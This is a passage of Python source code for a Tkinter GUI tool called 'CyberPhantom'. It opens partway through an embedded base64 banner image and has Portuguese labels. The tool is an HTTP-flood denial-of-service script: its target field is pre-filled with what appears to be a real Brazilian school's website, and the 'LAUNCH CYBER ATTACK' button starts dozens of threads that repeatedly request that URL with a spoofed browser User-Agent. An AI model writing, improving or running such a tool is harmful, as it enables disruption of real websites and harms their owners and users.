WAsfCyWJ5W25nEf2r08b5TUuh3ZqWoKhbadQWMH1uFP3YCk1eb8SVjQoxniWqbTFpUQqdi3vABgNILbncA2vjjpuzWd6s09TMDJNTyT08iNrWZ1HuFmsb9Ttyw067PFFItZqC/Q0daoJFyUNpVUHqYxp/axXc/47y+CejlimM/cyVTjugbrDPG9lOuwDCRl2vsF+WATNbUL3UUXcCOSIuJHu2qQltgwPulLadvXF77OM/pfY6yirmjSCRNRdncuWAVYxGm6kppvtY+70GMVXCVfnVR7THQ+yiRV7x5GKo8gFjIARq8W2yg79eZxKjh7JMn8VbP7dUr+YjF1B9Re377fs4DZHVZln0aU8MYjpgsPe1EoNjLELM8Z5gm3urc7bkXOM1nEeX5EjQ5fpq65gRJUvYhT13HPf6q7beIkjFV4x7T6utXuY7UtNbSIotrr5MwAuPQWHpiik4DqzPMZaiRpppGkkc3ZmNyf8h5AbDpjkwYMAYMGDAGDBgwBgwYMAYMGDAGDBgwBgwYMAYMGDAZxYeHeN66hsKeodVH5tjqT91rgfK2K7gwDZj7W4KkBczy2Gf8ATQAMPgHuR8nGA0nC9XbTLUUTHex1W+BuHX7mGFNgwDmPAdPMYzT8Qo/dMGjWRlbQ2xBH0ux2H1emJeo4Mzh9Vs5gk1qqsW5lVYsovpPIknCDwYB8ycD5wyzrJm1OEqf7a31/Aqb+AW8CgbW5Y4a7gbw6KziKMR6URk1CxRL6VIMoBAJ2uDhKYL4BtHKOGqYjvq2erYDZU1advIoot+/gHadl1HtluVIrW2lmI1fhqY/vjClxjAW/iLtJzGtuslQUQ/m4vAvzt4j8ycVHGMGAMGDBgDBgwYAwYMGAMGDBgDBgwYAwYMGAMGDBgDBgwYAwYMGAMGDBgDBgwYAwYMGAMGDBgDBgwYAwYMGAMGDBgDBgwYAwYMGAMGDBgDBgwYD/2Q=="
            header, encoded = img_data.split(",", 1)
            decoded = base64.b64decode(encoded)
            image = Image.open(BytesIO(decoded))
            # Ajuste de tamanho para o banner
            image = image.resize((480, 160), Image.LANCZOS)
            self.photo = ImageTk.PhotoImage(image)
        except:
            self.photo = None

        # --- ESTILOS ---
        label_style = {"bg": "#0a0a0a", "fg": "#00ff00", "font": ("Courier", 10, "bold")}
        welcome_style = {"bg": "#0a0a0a", "fg": "#ff0000", "font": ("Courier", 12, "bold")}

        # --- INTERFACE ---
        if self.photo:
            tk.Label(master, image=self.photo, bg="#0a0a0a").pack(pady=10)

        # Saudação FSOCIETY
        tk.Label(master, text="[ SYSTEM ACCESS GRANTED ]", **label_style).pack(pady=5)

        tk.Label(master, text="ALVO (URL):", **label_style).pack()
        self.ent_url = tk.Entry(master, width=45, bg="#1a1a1a", fg="white", insertbackground="white")
        self.ent_url.insert(0, "https://escolahorasalegres.com.br")
        self.ent_url.pack(pady=5)

        # Saudação solicitada
        tk.Label(master, text="WELCOME TO THE CYBER-PHANTOM", **welcome_style).pack(pady=10)

        tk.Label(master, text="QUANTIDADE DE AGENTES:", **label_style).pack()
        self.ent_bots = tk.Entry(master, width=15, bg="#1a1a1a", fg="white", insertbackground="white")
        self.ent_bots.insert(0, "50")
        self.ent_bots.pack(pady=5)

        # Terminal de Logs
        self.txt_status = tk.Text(master, height=12, width=60, bg="black", fg="#00ff00", font=("Courier", 8))
        self.txt_status.pack(pady=10)

        # Botões de Comando
        self.btn_atacar = tk.Button(master, text="LAUNCH CYBER ATTACK", command=self.start_threads, 
                                   bg="#003300", fg="white", font=("Arial", 10, "bold"), width=30)
        self.btn_atacar.pack(pady=5)

        self.btn_parar = tk.Button(master, text="ABORT MISSION", command=self.stop_attack, 
                                  bg="#330000", fg="white", font=("Arial", 10, "bold"), width=30)
        self.btn_parar.pack(pady=5)

        self.ativo = False

    def log(self, mensagem):
        self.txt_status.insert(tk.END, f"> {mensagem}\n")
        self.txt_status.see(tk.END)

    def bot_process(self, bot_id, url):
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        while self.ativo:
            try:
                r = requests.get(url, headers=headers, timeout=5)
                self.log(f"Agente {bot_id}: Conexão OK - Status {r.status_code}")
            except:
                self.log(f"Agente {bot_id}: Alvo não responde (Timeout).")
            time.sleep(0.5)

    def start_threads(self):
        if self.ativo: return
        self.ativo = True
        url = self.ent_url.get()
        try:
            num_bots = int(self.ent_bots.get())
            self.log(f"Iniciando Protocolo Cyber-Phantom com {num_bots} agentes...")
            for i in range(num_bots):
                t = threading.Thread(target=self.bot_process, args=(i+1, url), daemon=True)
                t.start()
        except:
            messagebox.showerror("Erro", "Quantidade inválida.")
            self.ativo = False

    def stop_attack(self):
        self.ativo = False
        self.log("SISTEMA ABORTADO PELO OPERADOR.")

if __name__ == "__main__":
    root = tk.Tk()
    app = CyberPhantom(root)
    root.mainloop()
